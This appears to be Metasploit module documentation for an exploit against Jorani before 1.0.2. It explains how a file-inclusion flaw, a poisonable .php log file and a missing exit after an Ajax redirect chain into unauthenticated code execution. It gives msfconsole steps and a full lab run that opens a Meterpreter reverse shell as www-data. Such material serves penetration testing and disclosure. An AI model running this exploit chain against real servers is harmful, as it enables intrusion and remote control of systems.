## Vulnerable Application

Jorani prior to 1.0.2 allows unauthenticated users to execute arbitrary code.

This is due to a lack of sanitization on the language parameter, which can lead to the file inclusion of arbitrary ".php" files.

Moreover, the log file for jorani ends with ".php" in Jorani < 1.0.2.

Log poisoning is possible, an attacker can abuse this to store malicious data in the log file.

Data like '<?php ...;?>' can been added to the log file, then if this file is included by php, it will be executed.

Finally, the controller responsible for recovering a page doesn't properly redirect requests made by Ajax.

So the scripts will not stop after the redirection because an exit statement is missing.

Because of this, the attacker can make the script continue and reach the LFI vulnerability without being authenticated.

So by chaining these 3 vulnerabilities an unauthenticated user can execute arbitrary code on the application.

This module has been tested successfully on Jorani 1.0.0, Ubuntu 20.04 (x86_64) with kernel version 5.15.0-75.

### Installation Steps
For a step by step installation tutorial on Ubuntu please refer to [How to install Jorani](https://jorani.org/how-to-install-jorani.html)

## Verification Steps
1. Start `msfconsole`
2. `use exploit/multi/php/jorani_path_trav`
3. set `RHOSTS` and `RPORT`
4. Confirm the target is vulnerable: `check`. The result expected is `The target appears to be vulnerable.`
5. Default payload for the exploit will be `php/meterpreter/reverse_tcp`
6. set `LHOST`
7. `exploit`
8. Confirm you have now a cmd session as www-data

## Options

### TARGETURI (optional)
The path to the jorani website. By default it is empty.

## Scenarios

```
msf6 exploit(multi/php/jorani_path_trav) > options

Module options (exploit/multi/php/jorani_path_trav):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     172.16.199.158   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  jorani           yes       The base path of Jorani
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.16.199.1     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Jorani < 1.0.2



View the full module info with the info, or info -d command.

msf6 exploit(multi/php/jorani_path_trav) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking Jorani version
[+] Jorani seems to be running on the target!
[+] Found version: 1.0.0
[+] The target appears to be vulnerable.
[*] Trying to exploit LFI
[*] Recovering CSRF token
[+] CSRF found: be7e8205ad5f1fae2834478acdd0b546
[*] Poisoning log with payload..
[*] Sending 1st payload
[*] Including poisoned log file log-2023-08-18.php.
[+] Triggering payload
[*] Sending stage (39927 bytes) to 172.16.199.158
[*] Meterpreter session 1 opened (172.16.199.1:4444 -> 172.16.199.158:39624) at 2023-08-18 15:01:55 -0400

meterpreter > getuid
Server username: www-data
meterpreter > sysinfo
Computer    : ubuntu
OS          : Linux ubuntu 5.15.0-79-generic #86~20.04.2-Ubuntu SMP Mon Jul 17 23:27:17 UTC 2023 x86_64
Meterpreter : php/linux
meterpreter > exit
```

